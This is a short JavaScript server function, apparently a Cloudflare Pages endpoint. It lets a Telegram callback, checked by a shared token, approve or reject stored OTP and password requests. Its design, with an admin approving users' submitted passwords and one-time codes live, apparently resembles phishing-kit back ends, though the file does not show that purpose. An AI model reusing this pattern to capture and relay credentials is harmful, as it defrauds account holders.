import { makeJsonResponse, makeTextResponse, getRequestFromKV, setRequestInKV } from "../_shared.js";

async function applyAction(env, requestId, action) {
  // Try OTP first, then password
  let item = await getRequestFromKV(env, requestId, "otp");
  let type = "otp";
  
  if (!item) {
    item = await getRequestFromKV(env, requestId, "password");
    type = "password";
  }

  if (!item) return false;

  if (action === "approve") {
    item.approved = true;
    item.rejectedReason = null;
  } else if (action === "reject") {
    item.rejectedReason = "Admin rejected the request";
    item.approved = false;
  }
  
  await setRequestInKV(env, requestId, item, type);
  return true;
}

export async function onRequest(context) {
  const { request, env } = context;

  if (request.method === "OPTIONS") return makeTextResponse("", 204);

  let params = null;
  let action = null;
  let requestId = null;

  if (request.method === "GET") {
    const url = new URL(request.url);
    params = url.searchParams;
    requestId = params.get("requestId");
    action = params.get("action");
    const token = params.get("token");

    if (token !== env.TELEGRAM_CALLBACK_TOKEN) {
      return makeTextResponse("<h3>Invalid token</h3>", 401);
    }

    if (!requestId || !action) {
      return makeTextResponse("<h3>Missing requestId/action</h3>", 400);
    }

    const updated = await applyAction(env, requestId, action);
    if (!updated) return makeTextResponse("<h3>Request not found</h3>", 404);

    return makeTextResponse(`<h3>OTP ${action === "approve" ? "approved ✅" : "rejected ❌"}</h3>`);
  }

  if (request.method === "POST") {
    let body;
    try {
      body = await request.json();
    } catch (error) {
      return makeJsonResponse({ error: "Invalid JSON" }, 400);
    }

    requestId = body.requestId;
    action = body.action;
    const token = body.token;

    if (token !== env.TELEGRAM_CALLBACK_TOKEN) {
      return makeJsonResponse({ error: "Invalid token" }, 401);
    }

    if (!requestId || !action) {
      return makeJsonResponse({ error: "Missing requestId/action" }, 400);
    }

    const updated = await applyAction(env, requestId, action);
    if (!updated) return makeJsonResponse({ error: "Request not found" }, 404);

    return makeJsonResponse({ success: true, message: `Request ${action} completed` });
  }

  return makeJsonResponse({ error: "Method not allowed" }, 405);
}
